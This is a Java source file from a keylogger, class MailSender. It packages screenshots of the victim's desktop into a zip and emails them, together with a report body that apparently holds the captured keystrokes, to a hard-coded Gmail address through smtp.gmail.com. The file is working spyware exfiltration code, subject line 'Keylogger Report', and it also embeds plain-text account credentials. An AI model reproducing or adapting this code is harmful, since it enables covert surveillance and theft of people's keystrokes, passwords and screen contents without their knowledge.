package com.radwanfaci;

import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Properties;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import javax.imageio.ImageIO;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class MailSender {

	static Properties mailServerProperties;
	static Session getMailSession;
	static MimeMessage message;

	/*
	 * public static void main(String args[]) throws AddressException,
	 * MessagingException, InterruptedException { int count = 1; while(count<5)
	 * { String message = "Helo World! This is message number " + count + "!";
	 * generateAndSendEmail(message); System.out.println(
	 * "\n\n ===> Your Java Program has just sent an Email successfully. Check your email.."
	 * ); count++; Thread.sleep(10000); } }
	 */

	public static void generateAndSendEmail(String body)
			throws AddressException, MessagingException {

		// Step1
		System.out.println("\n 1st ===> setup Mail Server Properties..");
		mailServerProperties = System.getProperties();
		mailServerProperties.put("mail.smtp.port", "587");
		mailServerProperties.put("mail.smtp.auth", "true");
		mailServerProperties.put("mail.smtp.starttls.enable", "true");
		System.out
				.println("Mail Server Properties have been setup successfully..");

		// Step2
		System.out.println("\n\n 2nd ===> get Mail Session..");
		getMailSession = Session.getDefaultInstance(mailServerProperties, null);
		message = new MimeMessage(getMailSession);
		Multipart multipart = new MimeMultipart(); // TODO: Implement sending
													// pngs
													// (http://www.codejava.net/java-ee/javamail/send-e-mail-with-attachment-in-java)
		message.addRecipient(Message.RecipientType.TO, new InternetAddress(
				"hacktheplanet460@gmail.com"));
		message.setSubject("Keylogger Report");
		// creates body part for the message
		MimeBodyPart messageBodyPart = new MimeBodyPart();
		messageBodyPart.setContent(body, "text/html");

		// creates body part for the attachment
		int count = 0;
		ArrayList<File> files = new ArrayList<File>();
		MimeBodyPart attachPart = new MimeBodyPart();
		for (BufferedImage bf : Screenshotter.getScreenShots()) {
			File file = new File(NativeEventListeners.desktopPath + File.separatorChar + "screenshot_" + (count++) + ".png");
			try {
				System.out.println("Writing... " + count);
				ImageIO.write(bf, "PNG", file);
				System.out.println("Done writing...");
				files.add(file);
				System.out.println("File added");
				file.deleteOnExit();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
		System.out.println("Compressing and attaching...");
		File zip = null;
		try {
			zip = zipFiles(files);
			attachPart.attachFile(zip);
			zip.deleteOnExit();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		multipart.addBodyPart(attachPart);
		multipart.addBodyPart(messageBodyPart);
		message.setContent(multipart, "text/html");
		System.out.println("Mail Session has been created successfully..");

		// Step3
		System.out.println("\n\n 3rd ===> Get Session and Send mail");
		Transport transport = getMailSession.getTransport("smtp");
		// Enter your correct gmail UserID and Password (XXXApp Shah@gmail.com)
		transport.connect("smtp.gmail.com", "hacktheplanet460@gmail.com",
				"hacktheplanet460gmail");
		transport.sendMessage(message, message.getAllRecipients());
		transport.close();
		System.out
				.println("\n\n ===> Your Java Program has just sent an Email successfully. Check your email..");
	}

	private static File zipFiles(ArrayList<File> files) {
		String zipFile = NativeEventListeners.desktopPath + File.separatorChar + "screenshots.zip";
		try {
			// create byte buffer
			byte[] buffer = new byte[1024];
			FileOutputStream fos = new FileOutputStream(zipFile);
			ZipOutputStream zos = new ZipOutputStream(fos);
			for (File file : files) {
				File srcFile = file;
				FileInputStream fis = new FileInputStream(srcFile);
				// begin writing a new ZIP entry, positions the stream to the
				// start of the entry data
				zos.putNextEntry(new ZipEntry(srcFile.getName()));
				int length;
				while ((length = fis.read(buffer)) > 0) {
					zos.write(buffer, 0, length);
				}
				zos.closeEntry();
				// close the InputStream
				fis.close();
			}
			// close the ZipOutputStream
			zos.close();
			return new File(zipFile);
		} catch (IOException ioe) {
			System.out.println("Error creating zip file: " + ioe);
		}
		return null;

	}
}